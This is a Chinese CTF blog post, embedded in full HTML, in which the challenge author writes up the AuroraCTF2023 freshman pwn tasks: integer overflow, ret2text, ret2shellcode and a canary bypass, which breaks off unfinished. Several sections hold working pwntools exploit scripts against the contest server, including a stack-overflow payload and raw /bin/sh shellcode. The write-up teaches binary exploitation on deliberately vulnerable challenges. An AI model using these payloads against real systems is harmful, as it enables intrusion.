@@ -1,0 +1,774 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme="dark" >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    记第一次出Pwn题——AuroraCTF2023第一批Pwn |
+    
+    T3uk1 の 庭院
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+<link rel="stylesheet" href="/css/loader.css">
+
+  <meta name="description" content="记第一次出Pwn题——AuroraCTF2023第一批Pwn  这次新生赛pwn的题全都是我出的（恼），虽然花了挺多时间的，但还是收获不少。 如何使用docker部署pwn题看这里：使用docker部署pwn题 下面是这次出的8道题的WP，考虑到面试与正式赛的时间间隔较短，且正式赛时间仅有2天，复现时间仅有7天，在出题的时候特意降低了难度，最难只到了ret2libc。出题人水平太菜了求轻喷（">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记第一次出Pwn题——AuroraCTF2023第一批Pwn">
+<meta property="og:url" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/index.html">
+<meta property="og:site_name" content="T3uk1 の 庭院">
+<meta property="og:description" content="记第一次出Pwn题——AuroraCTF2023第一批Pwn  这次新生赛pwn的题全都是我出的（恼），虽然花了挺多时间的，但还是收获不少。 如何使用docker部署pwn题看这里：使用docker部署pwn题 下面是这次出的8道题的WP，考虑到面试与正式赛的时间间隔较短，且正式赛时间仅有2天，复现时间仅有7天，在出题的时候特意降低了难度，最难只到了ret2libc。出题人水平太菜了求轻喷（">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023115622990.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023115655969.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023120050449.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231025193713539.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023122638914.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023123214264.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023132127507.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023172115519.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023172129483.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023172222483.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023172331057.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023173247783.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023173102886.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231024100618935.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231024100722147.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231024100812199.png">
+<meta property="og:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231024100929056.png">
+<meta property="article:published_time" content="2023-10-31T02:28:19.000Z">
+<meta property="article:modified_time" content="2023-10-31T02:49:02.954Z">
+<meta property="article:author" content="*月遇丛雲花遇風*">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://t3uk1.github.io/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/image-20231023115622990.png">
+  
+    <link rel="alternate" href="/atom.xml" title="T3uk1 の 庭院" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css">
+
+  
+  
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/wowjs@1.1.3/css/libs/animate.css">
+
+    
+<script src="https://npm.webcache.cn/wowjs@1.1.3/dist/wow.min.js"></script>
+
+    <script>
+      new WOW({
+        offset: 0,
+        mobile: true,
+        live: false
+      }).init();
+    </script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+          <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <span class="main-nav-icon"></span>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.jpg" alt="记第一次出Pwn题——AuroraCTF2023第一批Pwn">
+    
+  
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div id="logo-wrap">
+        
+          
+          
+            <a href="/" id="logo">
+              <h1>记第一次出Pwn题——AuroraCTF2023第一批Pwn</h1>
+            </a>
+          
+        
+      </div>
+      
+        
+        <h2 id="subtitle-wrap">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" class="outer">
+          
+          <section id="main"><article id="post-记第一次出Pwn题——AuroraCTF2023第一批Pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    <div class="article-meta">
+      <div class="article-date wow slideInLeft">
+  <a href="/2023/10/31/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BAPwn%E9%A2%98%E2%80%94%E2%80%94AuroraCTF2023%E7%AC%AC%E4%B8%80%E6%89%B9Pwn/" class="article-date-link">
+    <time datetime="2023-10-31T02:28:19.000Z" itemprop="datePublished">2023-10-31</time>
+    <time style="display: none;" id="post-update-time">2023-10-31</time>
+  </a>
+</div>
+
+      
+  <div class="article-category wow slideInLeft">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a><a class="article-category-link" href="/categories/CTF/pwn/">pwn</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="记第一次出pwn题auroractf2023第一批pwn"><a class="markdownIt-Anchor" href="#记第一次出pwn题auroractf2023第一批pwn"></a> 记第一次出Pwn题——AuroraCTF2023第一批Pwn</h1>
+<!-- toc -->
+<p><s>这次新生赛pwn的题全都是我出的（恼）</s>，虽然花了挺多时间的，但还是收获不少。</p>
+<p>如何使用docker部署pwn题看这里：<a href="https://t3uk1.github.io/2023/10/31/使用docker部署pwn题/" target="_blank">使用docker部署pwn题</a></p>
+<p>下面是这次出的8道题的WP，考虑到面试与正式赛的时间间隔较短，且正式赛时间仅有2天，复现时间仅有7天，在出题的时候特意降低了难度，最难只到了ret2libc。<s>出题人水平太菜了求轻喷（</s></p>
+<h2 id="1nc"><a class="markdownIt-Anchor" href="#1nc"></a> <a target="_blank" rel="noopener" href="http://1.nc">1.nc</a></h2>
+<p><s>不会有人装了虚拟机还不会nc吧(</s></p>
+<h2 id="2nc2"><a class="markdownIt-Anchor" href="#2nc2"></a> 2.nc2</h2>
+<p>使用close(1)关闭了标准输出流</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 1&gt;&amp;0	</span><br></pre></td></tr></table></figure>
+<p>使用上面的指令重定向即可正常回显</p>
+<p>至于为什么找了个博客你们参考下：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xirenwang/article/details/104139866">https://blog.csdn.net/xirenwang/article/details/104139866</a></p>
+<p>flag路径为gift/flag/flag</p>
+<p><s>没错flag外面还套了个叫flag的目录</s></p>
+<h2 id="3口算master"><a class="markdownIt-Anchor" href="#3口算master"></a> 3.口算Master</h2>
+<p>使用pwntools脚本完成交互即可</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;actf-node.szu.moe&#x27;</span>, <span class="number">10056</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./calc&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;U have 5 minutes to solve these challenges.\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    challenge = p.recvline().decode().strip()</span><br><span class="line">    <span class="built_in">print</span>(challenge)</span><br><span class="line">    num1, operator, num2, x, y = challenge.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    num1 = <span class="built_in">int</span>(num1)</span><br><span class="line">    num2 = <span class="built_in">int</span>(num2)</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        result = num1 + num2</span><br><span class="line">    <span class="keyword">elif</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        result = num1 - num2</span><br><span class="line">    <span class="keyword">elif</span> operator == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        result = num1 * num2</span><br><span class="line">    <span class="keyword">elif</span> operator == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">        result = num1 / num2</span><br><span class="line">    <span class="keyword">elif</span> operator == <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">        result = num1 % num2</span><br><span class="line">    <span class="keyword">elif</span> operator == <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">        result = num1 &amp; num2</span><br><span class="line">    <span class="keyword">elif</span> operator == <span class="string">&#x27;|&#x27;</span>:</span><br><span class="line">        result = num1 | num2</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(result))</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><s>出题的时候本来想着加上% ,&amp;,|运算的，结果生成的时候忘记改了所以你们做到的版本是只有加减乘除（</s></p>
+<p>不过问题不大，这道题就是用来让你们熟悉pwntools脚本交互的。</p>
+<h2 id="4寰宇蝗灾"><a class="markdownIt-Anchor" href="#4寰宇蝗灾"></a> 4.寰宇蝗灾</h2>
+<p><s>其实这道题一开始放上去的时候有个bug导致了非预期解就是在菜单的时候输入除了1和2的任意字符都可以直接爆出flag，后面检查才发现源代码有个地方循环没写好，多亏了研一师兄第一时间找到了这个bug</s></p>
+<p>考点：整数溢出</p>
+<p>IDA反汇编注意到success函数：</p>
+<img src="image-20231023115622990.png" alt="success" style="zoom: 67%;">
+<p>按x交叉引用知check函数调用了：</p>
+<img src="image-20231023115655969.png" alt="check" style="zoom:80%;">
+<p>分析得check函数的传入值为负数的时候就能调用success，回到主函数观察结构</p>
+<img src="image-20231023120050449.png" alt="main" style="zoom:80%;">
+<p>传入check的值是v5，初值为3，每轮循环会*2，v4初值为20，每轮循环中都会–，v4=0的时候退出循环，因此推测v4控制循环次数，共执行20轮循环。</p>
+<p>我们知道，3*2^20这个数是一个正数，这并不能满足check的条件，因此需要在attack中进行操作。</p>
+<p>下面先简单讲讲什么是整数溢出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">整数溢出</span><br><span class="line">int类型数据存储方式是以补码存储的，对于32位int来说，其最高位为符号位，符号位为0的时候表示正数，符号位为1表示负数</span><br><span class="line">符号位为0时，数据表示的数就是他本身（正数），符号位为1时，其表示的实际数据为-（每一位按位取反+1）的结果</span><br><span class="line">例如：</span><br><span class="line">32位int能表示的最大正数为2^31-1，用十六进制表示即为7FFF FFFF</span><br><span class="line">二进制表示为： </span><br><span class="line">0111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111 1111</span><br><span class="line">符号位为0，是正数</span><br><span class="line">当这个数执行+1的操作时就变为</span><br><span class="line">1000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 </span><br><span class="line">即8000 0000，符号位为1，是负数，这表示的是-2^31。</span><br><span class="line">两个同符号的数相加结果变成了另一种符号，这就是发生了溢出。</span><br></pre></td></tr></table></figure>
+<p>可以自己写个程序验证一下</p>
+<p><img src="image-20231025193713539.png" alt="intoverflow"></p>
+<p>回到题目，在atack函数中</p>
+<img src="image-20231023122638914.png" alt="attack" style="zoom:80%;">
+<p>可以输入一个int类型的数来改变虫群的数量，在这里仅对输入值/2进行了判断，因此可以输入一个负的大数来令虫群数量溢出为负数，例如-2^32-1，由于检验的是输入值/2，因此在一个相当大的区间内的数都是符合条件的。但是在构造大负数的时候要注意不能过大，否则输入数本身就溢出为负数，这时候前面加个负号就从负数变为一个很大的正数，这样就不满足条件了。</p>
+<p><img src="image-20231023123214264.png" alt="success"></p>
+<h2 id="5幽幽子的食物"><a class="markdownIt-Anchor" href="#5幽幽子的食物"></a> 5.幽幽子的食物</h2>
+<p>ret2text</p>
+<p>查看保护：</p>
+<p><img src="image-20231023132127507.png" alt="checksec"></p>
+<p>没有开canary，说明可以直接进行溢出</p>
+<p>在IDA反汇编后发现有后门函数</p>
+<p><img src="image-20231023172115519.png" alt="gift"></p>
+<p>主函数：</p>
+<p><img src="image-20231023172129483.png" alt="main"></p>
+<p>在s中可读入0x100大小，肯定能溢出。</p>
+<p>双击s查看栈结构：</p>
+<p><img src="image-20231023172222483.png" alt="stack_of_main"></p>
+<p>要进行溢出，需要填充0x30（s的大小） + 0x8（rbp）字节的字符，然后再发送目标后门地址。</p>
+<p><img src="image-20231023172331057.png" alt="backdoor"></p>
+<p>在汇编界面找到后门函数执行system(“/bin/sh”)的地方，溢出后返回到这里，由于栈对齐的影响返回到gift函数开头可能无法成功getshell，比较保险的方法是直接跳转到这里。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># sh = process([&#x27;./pwn&#x27;])</span></span><br><span class="line">sh = remote(<span class="string">&#x27;actf-node.szu.moe&#x27;</span>, <span class="number">10077</span>)</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x4011ac</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> + p64(backdoor_addr)</span><br><span class="line">sh.sendafter(<span class="string">b&#x27;Can you find it?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="6幽幽子的食物2"><a class="markdownIt-Anchor" href="#6幽幽子的食物2"></a> 6.幽幽子的食物2</h2>
+<p>ret2shellcode</p>
+<p>shellcode事什么？</p>
+<blockquote>
+<p>shellcode是一段用于利用软件<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%BC%8F%E6%B4%9E">漏洞</a>而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%AE%BC%E5%B1%A4">shell</a>而得名。shellcode常常使用<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%9C%BA%E5%99%A8%E8%AF%AD%E8%A8%80">机器语言</a>编写，由于现代电脑系统基本上启用<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/NX%E4%BD%8D%E5%85%83">NX位元</a>保护使得机械码无法直接执行，可透过<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B">返回导向编程</a>编写shellcode。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机械码，让电脑可以执行攻击者的任意指令。         ——摘自WikiPedia</p>
+</blockquote>
+<p>ret2shellcode事什么？</p>
+<p>参考ctfwiki：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode</a></p>
+<p>回到本题，让我们先看看这道题的结构</p>
+<p>查看保护：</p>
+<p><img src="image-20231023173247783.png" alt="checksec"></p>
+<p>全关了</p>
+<p>看IDA反汇编：</p>
+<p><img src="image-20231023173102886.png" alt="main"></p>
+<p>首先输出了buf的地址，然后可以在buf写入最多0x20字节，然后对v5进行read，显然在v5处是可以直接溢出的。</p>
+<p>这题没有了后门函数，因此就需要用到前面的buf。</p>
+<p>根据上面的简介我们已经了解shellcode可以让机器执行指定的命令从而getshell，在本题而言，由于没有开NX保护，可以直接在buf处写入合适长度的shellcode，然后在后面栈溢出返回到buf处即可。</p>
+<p>那么，shellcode怎么获得呢，一般来说，如果没有特殊的限制，直接调用asm(<a target="_blank" rel="noopener" href="http://shellcraft.sh">shellcraft.sh</a>())就能直接生成一个可行的shellcode，实际测试发现这个生成的shellcode长度超过了buf的长度，因此可以在下面这个网站中找一个更短的别人生成好的shellcode</p>
+<p><a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">https://shell-storm.org/shellcode/index.html</a></p>
+<p>对于linux 64位文件，我们应该找的是Linux Intel x86-64列表下的shellcode</p>
+<p>这里出题的时候特意让其中的几个shellcode满足条件，可以直接用，如果遇到长度限制更加严格、或者有其他限制的情况，就需要手搓shellcode了。<s>这就不是现在探讨的问题了(</s></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;xxxxxxxx&#x27;</span>, ?????)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Here is your gift: 0x&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 接收buf的地址</span></span><br><span class="line"><span class="comment">#print(&quot;buf_addr: &quot;, hex(buf_addr))</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;Where do you want to place it?\n&quot;</span>, shellcode)</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> + p64(buf_addr)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Bye~\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="7starrail"><a class="markdownIt-Anchor" href="#7starrail"></a> 7.StarRail</h2>
+<p>考点：泄露canary，canary绕过</p>
+<p><s>相信了解了ELF文件保护模式的你们一定知道</s> canary保护是检测栈溢出的一种手段，开启之后程序会在栈的某个地方填入canary，并将这个canary保存起来。32位程序中的canary为4字节，64位程序中的canary为8字节，且<strong>最后一个字节为空白字符（\x00）</strong>。</p>
+<p>64位程序canary的位置一般位于rbp-8的位置，在程序返回之前，会先比较栈上canary的值和保存的canary值是否相同，如果不同，说明发生了栈溢出，将会跳转到__stack_chk_fail函数，然后程序就会寄掉。</p>
+<p>那要绕过canary保护其实也很简单，首先泄露canary，然后在构造payload的时候，在canary的位置把泄露出来的canary填回去就能绕过检测，正常执行栈溢出。</p>
+<p>本题开启了canary保护的栈结构如下图所示：</p>
+<img src="image-20231024100618935.png" alt="canary" style="zoom:80%;">
+<p>那么可以看到其中var_8对应的就是canary。</p>
+<p>可以看到有后门函数：</p>
+<img src="image-20231024100722147.png" alt="gift" style="zoom:80%;">
+<p>但是需要用到srcret，那么secret是什么呢，我们可以双击查看</p>
+<p><img src="image-20231024100812199.png" alt="secret"></p>
